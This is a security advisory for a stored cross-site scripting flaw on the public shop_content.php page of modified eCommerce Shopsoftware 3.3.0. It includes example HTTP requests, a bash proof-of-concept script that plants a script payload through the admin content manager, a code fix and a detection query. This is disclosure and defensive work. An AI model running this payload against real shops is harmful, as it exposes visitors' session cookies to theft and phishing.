# Security Advisory: Stored Cross-Site Scripting in shop_content.php — Public Content Page

> **Identifier:** Pending CVE assignment
> **Publication Date:** 16/11/2026
> **Last Updated:** 16/11/2026
> **Severity:** Medium
> **CVSS:** 5.4 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`
> **CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') — Stored
> **Status:** Unpatched

---

## 1. Executive Summary

modified eCommerce Shopsoftware v3.3.0 contains a Stored Cross-Site Scripting vulnerability on the public-facing `shop_content.php` page. Content entries managed via the admin content manager are saved with `xtc_db_prepare_input()` (no HTML encoding) and echoed on the public page without `htmlspecialchars()`. This affects all unauthenticated visitors: any admin-injected payload executes in every visitor's browser who loads the affected content page, making this a broader-impact XSS than the admin-only variants.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| modified eCommerce Shopsoftware | ≤ 3.3.0 (rev 16825) | None | Affected |
| Component: shop_content.php (public) | rev 16825 | None | Affected |
| Component: admin/content_manager.php | rev 16825 | None | Affected |

- **Repository / Ecosystem:** https://www.modified-shop.org
- **Evaluated stack:** PHP 8.1.34, Apache 2.4, MariaDB 10.6, Debian Linux (Docker)

---

## 3. Vulnerability Description

Content records stored in the `content_manager` table are managed via `admin/content_manager.php`, which saves the content heading and body fields using `xtc_db_prepare_input()`. When `shop_content.php` renders a content page for public visitors, these fields are echoed directly without HTML encoding:

```php
// shop_content.php (content heading / body output section)
echo $shop_content_data['content_heading'];
// or echoed inside HTML template
echo $shop_content_data['content_text'];
// xtc_db_prepare_input = trim() + stripslashes() — no htmlspecialchars()
```

An admin who sets a content heading or body to include `<script>alert(1)</script>` stores the payload. Every unauthenticated visitor who loads `shop_content.php?coID=<id>` executes the script.

### Necessary Conditions

- **Authentication:** Admin (to set up payload) + None (to trigger)
- **User interaction:** Required — victim must load the content page
- **Attack vector:** Network

---

## 4. Impact

- **Confidentiality:** Low — session cookies (non-HttpOnly), localStorage, page content accessible
- **Integrity:** Low — phishing, credential harvesting, redirects
- **Availability:** None

**Public-facing scope**: Unlike admin-only XSS (V11–V13), this payload executes in the browsers of all shop visitors — potentially thousands of customers — making this significantly more impactful than admin-only variants despite the same CVSS base metric score.

---

## 5. Classification

### CVSS

- **Score:** 5.4
- **Severity:** Medium
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | Low (admin = "low" in this context since there's no "High" for admin-only create + public impact) |
| User Interaction (UI) | Required |
| Scope (S) | Changed |
| Confidentiality (C) | Low |
| Integrity (I) | Low |
| Availability (A) | None |

### CWE

- CWE-79: Improper Neutralization of Input During Web Page Generation (Stored XSS)

### CAPEC

- CAPEC-198: XSS Stored
- CAPEC-86: XSS via HTTP Query Strings

---

## 6. Exploitation Scenario

1. Admin injects JavaScript payload in a content entry heading/body via admin content manager.
2. Payload stored in `content_manager` table without encoding.
3. Any visitor (including unauthenticated users) who visits `shop_content.php?coID=<affected_id>` has the script execute in their browser.
4. Payload can steal session cookies, capture form input, redirect to phishing page, or perform drive-by attacks.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): shop_content.php (content heading/body output)
         admin/content_manager.php (content_heading, content_text fields)
         Database table: content_manager
Parameter(s): coID (GET — public endpoint)
Method: GET (unauthenticated trigger)
Authentication: Admin to inject; None to trigger
```

### Example Request (inject payload — admin)

```http
POST /admin/content_manager.php?action=insert HTTP/1.1
Host: TARGET
Cookie: MODsid=<ADMIN_SESSION_ID>
Content-Type: application/x-www-form-urlencoded

<securityToken>=<CSRF_VALUE>&content_heading[1]=<script>alert(document.cookie)</script>&content_text[1]=<b>Normal content</b>&...
```

### Example Request (trigger — unauthenticated)

```http
GET /shop_content.php?coID=<content_id> HTTP/1.1
Host: TARGET
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
```

### Observed Response

```html
HTTP/1.1 200 OK

<h1 class="contentHeading"><script>alert(document.cookie)</script></h1>
```

### Result

Confirmed in authorized Docker lab. Content heading saved with XSS payload via admin. On unauthenticated GET to `shop_content.php?coID=<id>`, `alert(document.cookie)` executes in visitor's browser.

**Evidence:** `<script>alert(document.cookie)</script>` unencoded in HTTP response body for unauthenticated GET request.

---

## 8. Proof of Concept

```bash
#!/bin/bash
# V14 PoC — Stored XSS in shop_content.php (public)
TARGET="http://localhost:9080"
SID="<ADMIN_SESSION_ID>"
UA="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"

# Step 1: Get CSRF token from admin content manager
CSRF=$(curl -s -b "MODsid=$SID" -H "User-Agent: $UA" \
  "http://TARGET/admin/content_manager.php" | \
  grep -oP '(?<=name="securityToken" value=")[^"]+')

echo "CSRF: $CSRF"

# Step 2: Create content entry with XSS payload in heading
# (content_group determines which shop_content.php page renders it)
curl -s -b "MODsid=$SID" -H "User-Agent: $UA" \
  -X POST "http://TARGET/admin/content_manager.php?action=insert" \
  --data-urlencode "securityToken=$CSRF" \
  --data-urlencode 'content_heading[1]=<script>alert(document.cookie)</script>' \
  --data-urlencode 'content_text[1]=Normal content text here' \
  --data-urlencode 'content_group=1' \
  --data-urlencode 'content_file=' \
  --data-urlencode 'content_status=1' \
  -o /dev/null

# Get the new content ID
CONTENT_ID=$(docker exec modifiedshop_db mysql -ushopuser -pshoppassword modified_shop \
  -e "SELECT MAX(content_id) FROM content_manager;" 2>/dev/null | tail -1)

echo "New content ID: $CONTENT_ID"

# Step 3: Trigger as unauthenticated visitor
RESP=$(curl -s "http://TARGET/shop_content.php?coID=$CONTENT_ID" -H "User-Agent: $UA")
echo "$RESP" | grep -i "script"

# Expected: <script>alert(document.cookie)</script> in response
```

### Expected Result

```text
HTTP/1.1 200 OK
[Response body (unauthenticated):]
<h1 class="contentHeading"><script>alert(document.cookie)</script></h1>
```

### PoC Limitations

- Alert-based PoC; no real data exfiltration.
- Content entry can be deleted after testing.
- Benign test only; does not target real users.

---

## 9. Reproduction Steps

1. Log in as admin.
2. Navigate to Admin → Content Manager → New Content.
3. Enter `<script>alert(1)</script>` in the Heading field for language 1. Save.
4. Note the content ID.
5. As unauthenticated user, visit `GET /shop_content.php?coID=<id>`.
6. Browser executes `alert(1)` — confirm Stored XSS on public page.

---

## 10. Mitigation

- Apply `htmlspecialchars()` to all content fields at output time in `shop_content.php`.
- Consider applying a content security policy (CSP) to limit script execution on the public site.

---

## 11. Fix

**No official fix as of 16/11/2026.**

```php
// shop_content.php — Vulnerable:
echo $shop_content_data['content_heading'];

// Fixed:
echo htmlspecialchars($shop_content_data['content_heading'], ENT_QUOTES, 'UTF-8');
// Apply same fix to content_text and all other echoed content_manager fields
```

---

## 12. Detection and Indicators

- `content_manager` rows with `content_heading` or `content_text` containing `<script>` or similar.
- GET requests to `shop_content.php` triggering browser-side errors.

### Example Log Search

```text
SELECT content_id, content_heading FROM content_manager WHERE content_heading LIKE '%<%';
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 16/11/2026 | Identified via code review |
| 16/11/2026 | Confirmed in authorized lab (unauthenticated trigger) |
| 16/11/2026 | Advisory prepared |
| pending | Vendor notified |
| pending | CVE requested |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** modified-shop.org team
- **Channel used:** Pending
- **Response status:** Awaiting response

---

## 15. Credits

- **Researcher:** vinniboy021 (@vinniboy021)
- **Organization:** Independent security researcher
- **Contact:** vinniboy021@gmail.com / https://github.com/vinniboy021

---

## 16. References

- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- OWASP XSS: https://owasp.org/www-community/attacks/xss/
- CVSS calculator: https://www.first.org/cvss/calculator/3.1

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 16/11/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

---

## 19. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/vinniboy021/agent-cve-hunter
